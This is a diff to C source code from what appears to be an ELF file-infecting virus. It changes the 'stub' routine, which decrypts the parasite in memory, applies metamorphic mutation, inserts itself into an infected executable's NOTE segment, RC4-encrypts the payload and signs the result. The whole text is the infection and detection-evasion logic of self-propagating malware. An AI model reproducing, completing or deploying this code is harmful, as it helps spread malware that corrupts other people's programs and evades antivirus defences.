@@ -58,12 +58,13 @@ __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_P
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
+void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)
 {
-
 #if LOGGER
 	MID_LOGGER("stub:\t\t\t");
 #endif
+
+	decrypt_left(keychain, (char *)parasite, (void *)stub - (void *)parasite);
 
 	if (context == FAILURE)
 		goto label;
@@ -73,10 +74,13 @@ void stub(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 
 	metamorph_stub();
 	patch_stub(host->segment);
-	insert_stub(injection->ptr, host->segment);
+	insert_stub(infect->ptr, host->segment);
 
-	RC4((unsigned char *)L1, stub_size, injection->ptr + host->segment[NOTE]->p_offset, parasite_size);
+	RC4((unsigned char *)L1, stub_size, infect->ptr + host->segment[NOTE]->p_offset, parasite_size);
 
 label:
-	signature(host, keychain, context, injection);
+	update_keychain_left(keychain, (char *)stub, (void *)sign - (void *)stub);
+	decrypt_left(keychain, (char *)sign, (void *)clean - (void *)sign);
+
+	sign(host, keychain, context, infect);
 }
